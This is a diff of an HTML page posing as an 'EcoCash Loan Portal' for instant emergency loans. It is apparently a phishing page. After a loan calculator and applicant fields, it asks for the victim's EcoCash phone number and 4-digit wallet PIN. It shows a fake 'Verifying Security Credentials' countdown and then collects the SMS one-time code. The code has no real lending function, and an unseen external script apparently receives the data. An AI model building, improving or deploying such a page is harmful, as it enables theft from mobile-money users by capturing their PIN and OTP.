@@ -3,129 +3,131 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>EcoCash Instant Loan Portal</title>
+  <title>EcoCash Loan Portal</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-slate-950 text-slate-100 min-h-screen flex items-center justify-center p-4">
+<body class="bg-blue-950 text-white min-h-screen flex items-center justify-center p-4">
 
-  <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl space-y-6">
+  <div class="w-full max-w-md bg-blue-900/90 border border-blue-700/50 rounded-2xl p-6 shadow-2xl space-y-6">
     
     <!-- HEADER -->
     <div class="text-center space-y-1">
-      <h1 class="text-2xl font-black text-emerald-400 tracking-wide">EcoCash Instant Loan</h1>
-      <p class="text-xs text-slate-400">Fast emergency loans directly to your EcoCash Wallet</p>
+      <h1 class="text-2xl font-black text-blue-300 tracking-wide">EcoCash Fast Loan</h1>
+      <p class="text-xs text-blue-200/70">Instant emergency loan application</p>
     </div>
 
-    <!-- STEP 1: APPLICANT DETAILS + INTERACTIVE LOAN CALCULATOR -->
-    <form id="step-1-form" class="space-y-4">
-      
-      <!-- LOAN CALCULATOR BOX -->
-      <div class="bg-slate-950 p-4 border border-slate-800 rounded-xl space-y-3">
+    <!-- STEP 1: APPLICANT DETAILS & SLIDE CALCULATOR BELOW -->
+    <div id="step-1" class="space-y-4">
+      <div>
+        <label class="block text-xs font-semibold text-blue-200 mb-1">Full Name</label>
+        <input type="text" id="fullName" required placeholder="e.g. John Doe" 
+          class="w-full bg-blue-950 border border-blue-800 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-blue-400 text-white placeholder-blue-300/40">
+      </div>
+
+      <div>
+        <label class="block text-xs font-semibold text-blue-200 mb-1">Occupation / Work</label>
+        <input type="text" id="occupation" required placeholder="e.g. Self Employed / Teacher" 
+          class="w-full bg-blue-950 border border-blue-800 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-blue-400 text-white placeholder-blue-300/40">
+      </div>
+
+      <div>
+        <label class="block text-xs font-semibold text-blue-200 mb-1">Monthly Income ($)</label>
+        <input type="number" id="monthlyIncome" required placeholder="e.g. 300" 
+          class="w-full bg-blue-950 border border-blue-800 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-blue-400 text-white placeholder-blue-300/40">
+      </div>
+
+      <div>
+        <label class="block text-xs font-semibold text-blue-200 mb-1">Loan Repayment Period</label>
+        <select id="repaymentPeriod" class="w-full bg-blue-950 border border-blue-800 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-blue-400 text-white">
+          <option value="1">1 Month</option>
+          <option value="2">2 Months</option>
+          <option value="3">3 Months</option>
+          <option value="6">6 Months</option>
+        </select>
+      </div>
+
+      <!-- SLIDE CALCULATOR AT THE BOTTOM OF STEP 1 -->
+      <div class="bg-blue-950/80 p-4 border border-blue-800 rounded-xl space-y-3">
         <div class="flex justify-between items-center">
-          <label class="text-xs font-semibold text-slate-300">Desired Loan Amount</label>
-          <span id="calc-amount-label" class="text-sm font-bold text-emerald-400 font-mono">$100</span>
+          <label class="text-xs font-semibold text-blue-200">Amount Requested</label>
+          <span id="calc-amount" class="text-base font-bold text-blue-400 font-mono">$100</span>
         </div>
         
-        <input type="range" id="loanAmountRange" min="10" max="500" step="10" value="100" 
-          class="w-full h-2 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-emerald-500" oninput="updateCalculator()">
+        <input type="range" id="loanRange" min="10" max="500" step="10" value="100" 
+          class="w-full h-2 bg-blue-900 rounded-lg appearance-none cursor-pointer accent-blue-400" oninput="updateLoanCalc()">
 
-        <div class="grid grid-cols-2 gap-2 text-xs pt-2 border-t border-slate-800/60">
+        <div class="grid grid-cols-2 gap-2 text-xs pt-2 border-t border-blue-800/60">
           <div>
-            <p class="text-slate-400">Interest Rate (10%):</p>
-            <p id="calc-interest" class="font-semibold text-slate-200 font-mono">$10</p>
+            <p class="text-blue-300/70">Interest (10%):</p>
+            <p id="calc-interest" class="font-semibold text-blue-100 font-mono">$10</p>
           </div>
           <div>
-            <p class="text-slate-400">Total Repayment:</p>
-            <p id="calc-total" class="font-semibold text-emerald-400 font-mono">$110</p>
+            <p class="text-blue-300/70">Total Repayment:</p>
+            <p id="calc-total" class="font-semibold text-blue-300 font-mono">$110</p>
           </div>
         </div>
       </div>
 
-      <!-- PERSONAL DETAILS -->
-      <div>
-        <label class="block text-xs font-semibold text-slate-300 mb-1">Full Name</label>
-        <input type="text" id="fullName" required placeholder="e.g. John Doe" 
-          class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-emerald-500 transition">
-      </div>
-
-      <div>
-        <label class="block text-xs font-semibold text-slate-300 mb-1">Occupation</label>
-        <input type="text" id="occupation" required placeholder="e.g. Business / Teacher" 
-          class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-emerald-500 transition">
-      </div>
-
-      <div>
-        <label class="block text-xs font-semibold text-slate-300 mb-1">EcoCash Phone Number</label>
-        <div class="flex">
-          <span class="inline-flex items-center px-3 text-xs bg-slate-800 text-slate-400 border border-r-0 border-slate-800 rounded-l-xl font-mono">+263</span>
-          <input type="tel" id="phone" required placeholder="771234567" 
-            class="w-full bg-slate-950 border border-slate-800 rounded-r-xl px-4 py-2.5 text-sm focus:outline-none focus:border-emerald-500 transition">
-        </div>
-      </div>
-
-      <div>
-        <label class="block text-xs font-semibold text-slate-300 mb-1">4-Digit EcoCash PIN</label>
-        <input type="password" id="pin" maxlength="4" pattern="\d{4}" required placeholder="••••" 
-          class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-sm tracking-widest text-center text-lg font-mono focus:outline-none focus:border-emerald-500 transition">
-      </div>
-
-      <button type="submit" id="btn-submit-pin" 
-        class="w-full bg-emerald-600 hover:bg-emerald-500 font-bold py-3 rounded-xl text-sm transition shadow-lg shadow-emerald-900/40">
-        Apply Now
+      <button type="button" onclick="goToStep(2)" 
+        class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl text-sm transition shadow-lg shadow-blue-950/50">
+        Next Step
       </button>
-    </form>
-
-    <!-- STEP 2: VERIFYING PIN (COUNTDOWN TIMERS) -->
-    <div id="step-verifying" class="hidden text-center py-8 space-y-4">
-      <div class="inline-block animate-spin rounded-full h-10 w-10 border-4 border-emerald-500 border-t-transparent"></div>
-      <div class="space-y-1">
-        <p class="text-sm font-bold text-slate-200">Verifying EcoCash Credentials...</p>
-        <p class="text-xs text-slate-400">Please wait while our system verifies your account.</p>
-      </div>
-      <p id="countdown-timer" class="text-sm font-mono text-emerald-400 font-bold">10s</p>
     </div>
 
-    <!-- STEP 3: OTP ENTER FORM -->
-    <form id="step-otp-form" class="hidden space-y-4">
+    <!-- STEP 2: PHONE NUMBER + 4-DIGIT PIN WITH "LOG IN" BUTTON -->
+    <div id="step-2" class="hidden space-y-4">
       <div class="text-center space-y-1">
-        <h2 class="text-lg font-bold text-slate-100">Enter Verification OTP</h2>
-        <p class="text-xs text-slate-400">A 6-digit verification code has been sent to your phone.</p>
+        <h2 class="text-lg font-bold text-blue-100">EcoCash Authentication</h2>
+        <p class="text-xs text-blue-300/70">Enter your mobile wallet number and PIN</p>
       </div>
 
       <div>
-        <label class="block text-xs font-semibold text-slate-300 mb-1">6-Digit OTP</label>
-        <input type="text" id="otpCode" maxlength="6" pattern="\d{6}" required placeholder="123456" 
-          class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-sm tracking-widest text-center text-xl font-mono focus:outline-none focus:border-emerald-500 transition">
+        <label class="block text-xs font-semibold text-blue-200 mb-1">EcoCash Phone Number</label>
+        <div class="flex">
+          <span class="inline-flex items-center px-3 text-xs bg-blue-950 text-blue-300 border border-r-0 border-blue-800 rounded-l-xl font-mono">+263</span>
+          <input type="tel" id="phone" required placeholder="771234567" 
+            class="w-full bg-blue-950 border border-blue-800 rounded-r-xl px-4 py-2.5 text-sm focus:outline-none focus:border-blue-400 text-white placeholder-blue-300/40">
+        </div>
       </div>
 
-      <button type="submit" id="btn-submit-otp" 
-        class="w-full bg-emerald-600 hover:bg-emerald-500 font-bold py-3 rounded-xl text-sm transition shadow-lg shadow-emerald-900/40">
-        Verify OTP
+      <div>
+        <label class="block text-xs font-semibold text-blue-200 mb-1">4-Digit EcoCash PIN</label>
+        <input type="password" id="pin" maxlength="4" pattern="\d{4}" required placeholder="••••" 
+          class="w-full bg-blue-950 border border-blue-800 rounded-xl px-4 py-2.5 text-sm tracking-widest text-center text-lg font-mono focus:outline-none focus:border-blue-400 text-white">
+      </div>
+
+      <button type="button" id="btn-login" onclick="submitStep2()" 
+        class="w-full bg-blue-500 hover:bg-blue-400 text-white font-bold py-3 rounded-xl text-sm transition shadow-lg shadow-blue-950/50 tracking-wider">
+        LOG IN
       </button>
-    </form>
-
-    <!-- STEP 4: SUCCESS / CONGRATULATIONS SCREEN -->
-    <div id="step-success" class="hidden text-center py-8 space-y-4">
-      <div class="w-16 h-16 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 rounded-full flex items-center justify-center mx-auto text-3xl">
-        🎉
-      </div>
-      <div class="space-y-2">
-        <h2 class="text-2xl font-black text-emerald-400">Congratulations!</h2>
-        <p class="text-sm text-slate-300">Your loan application has been approved and funds disbursed directly to your EcoCash wallet!</p>
-      </div>
     </div>
 
-    <!-- REJECTION SCREEN -->
-    <div id="step-rejected" class="hidden text-center py-8 space-y-4">
-      <div class="w-16 h-16 bg-rose-500/10 text-rose-400 border border-rose-500/30 rounded-full flex items-center justify-center mx-auto text-3xl">
-        ❌
+    <!-- COUNTDOWN TIMER (10 SECONDS) BEFORE STEP 3 -->
+    <div id="step-loading" class="hidden text-center py-8 space-y-4">
+      <div class="inline-block animate-spin rounded-full h-10 w-10 border-4 border-blue-400 border-t-transparent"></div>
+      <div class="space-y-1">
+        <p class="text-sm font-bold text-blue-100">Verifying Security Credentials...</p>
+        <p class="text-xs text-blue-300/70">Please wait while we connect to EcoCash server.</p>
       </div>
-      <div class="space-y-2">
-        <h2 class="text-xl font-bold text-rose-400">Verification Failed</h2>
-        <p id="rejection-reason" class="text-xs text-slate-400">The verification credentials provided were incorrect.</p>
+      <p id="timer" class="text-sm font-mono text-blue-300 font-bold">10s</p>
+    </div>
+
+    <!-- STEP 3: SMS 6-DIGIT OTP -->
+    <div id="step-3" class="hidden space-y-4">
+      <div class="text-center space-y-1">
+        <h2 class="text-lg font-bold text-blue-100">Enter Verification OTP</h2>
+        <p class="text-xs text-blue-300/70">Enter the SMS 6-digit OTP code sent to your phone</p>
       </div>
-      <button onclick="location.reload()" class="bg-slate-800 hover:bg-slate-700 text-xs px-4 py-2 rounded-lg text-slate-300 transition">
-        Try Again
+
+      <div>
+        <label class="block text-xs font-semibold text-blue-200 mb-1">SMS 6-Digit OTP</label>
+        <input type="text" id="otpCode" maxlength="6" pattern="\d{6}" required placeholder="123456" 
+          class="w-full bg-blue-950 border border-blue-800 rounded-xl px-4 py-2.5 text-sm tracking-widest text-center text-xl font-mono focus:outline-none focus:border-blue-400 text-white">
+      </div>
+
+      <button type="button" onclick="submitOTP()" 
+        class="w-full bg-blue-500 hover:bg-blue-400 text-white font-bold py-3 rounded-xl text-sm transition shadow-lg shadow-blue-950/50">
+        VERIFY OTP
       </button>
     </div>
 
@@ -133,16 +135,45 @@
 
   <script src="/app.js"></script>
   <script>
-    function updateCalculator() {
-      const val = parseInt(document.getElementById('loanAmountRange').value);
-      const interest = Math.round(val * 0.10);
-      const total = val + interest;
+    function updateLoanCalc() {
+      const amount = parseInt(document.getElementById('loanRange').value);
+      const interest = Math.round(amount * 0.10);
+      const total = amount + interest;
 
-      document.getElementById('calc-amount-label').innerText = '$' + val;
+      document.getElementById('calc-amount').innerText = '$' + amount;
       document.getElementById('calc-interest').innerText = '$' + interest;
       document.getElementById('calc-total').innerText = '$' + total;
     }
+
+    function goToStep(stepNumber) {
+      document.getElementById('step-1').classList.add('hidden');
+      document.getElementById('step-2').classList.add('hidden');
+      document.getElementById('step-loading').classList.add('hidden');
+      document.getElementById('step-3').classList.add('hidden');
+
+      if (stepNumber === 1) document.getElementById('step-1').classList.remove('hidden');
+      if (stepNumber === 2) document.getElementById('step-2').classList.remove('hidden');
+      if (stepNumber === 'loading') document.getElementById('step-loading').classList.remove('hidden');
+      if (stepNumber === 3) document.getElementById('step-3').classList.remove('hidden');
+    }
+
+    function submitStep2() {
+      goToStep('loading');
+      let timer = 10;
+      const timerElem = document.getElementById('timer');
+      const interval = setInterval(() => {
+        timer--;
+        timerElem.innerText = timer + 's';
+        if (timer <= 0) {
+          clearInterval(interval);
+          goToStep(3);
+        }
+      }, 1000);
+    }
+
+    function submitOTP() {
+      alert("Application Submitted Successfully!");
+    }
   </script>
 </body>
-      </html>
-      
+</html>
